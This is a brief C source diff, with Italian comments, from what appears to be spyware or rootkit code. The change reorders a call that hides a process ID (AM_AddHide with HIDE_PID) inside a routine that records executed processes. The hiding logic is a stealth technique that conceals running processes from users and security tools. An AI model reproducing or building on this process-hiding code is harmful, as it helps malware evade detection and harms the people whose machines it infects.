@@ -600,13 +600,13 @@ void SM_AddExecutedProcess(DWORD pid)
 	DWORD i;
 	pid_hide_struct pid_hide = NULL_PID_HIDE_STRUCT;
 
-	// Nasconde il PID passato
-	SET_PID_HIDE_STRUCT(pid_hide, pid);
-	AM_AddHide(HIDE_PID, &pid_hide);
-
 	// Aggiorna la lista dei PID eseguiti (se e' allocata)
 	if (!process_executed)
 		return;
+
+	// Nasconde il PID passato
+	SET_PID_HIDE_STRUCT(pid_hide, pid);
+	AM_AddHide(HIDE_PID, &pid_hide);
 
 	// Cerca un posto libero e inserisce il PID
 	for (i=0; i<MAX_PROCESS_EXECUTED; i++)
